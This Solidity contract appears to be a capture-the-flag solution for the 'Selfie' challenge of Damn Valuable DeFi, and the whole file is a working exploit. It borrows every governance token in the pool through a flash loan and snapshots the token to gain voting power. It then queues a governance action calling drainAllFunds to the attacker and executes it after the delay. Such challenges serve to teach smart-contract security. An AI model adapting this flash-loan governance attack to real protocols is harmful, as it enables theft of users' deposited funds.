// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {
    SelfiePool pool;
    SimpleGovernance gov;
    address private immutable owner;
    uint256 private actionId;

    constructor(SelfiePool _pool, SimpleGovernance _gov) {
        pool = _pool;
        gov = _gov;
        owner = msg.sender;
    }

    function exploitProposal() public {
        // 1. Trigger a flash loan of all available governance tokens
        ERC20 token = ERC20(pool.token());
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(DamnValuableTokenSnapshot token, uint256 amount)
        external
    {
        // 2. Create call data for the drainAllFunds() function with the owner (the attacker) as the receiver address
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        // 3. Snapshot is  needed so that the governance contract can read our balance from the latest snapshot
        token.snapshot();
        // 4. Propose action
        // - The target is the pool address
        // - The call data is defined above
        // - No ether sent
        actionId = gov.queueAction(address(pool), data, 0);
        // 5. Return flash loan
        token.transfer(address(pool), amount);
    }


    function exploitAction() external {
        // 6. After the action delay time has passed, call this function to execute the accepted proposal.
        // Even though there's a delay, there's no way to stop this action being executed.
        gov.executeAction(actionId);
    }
}
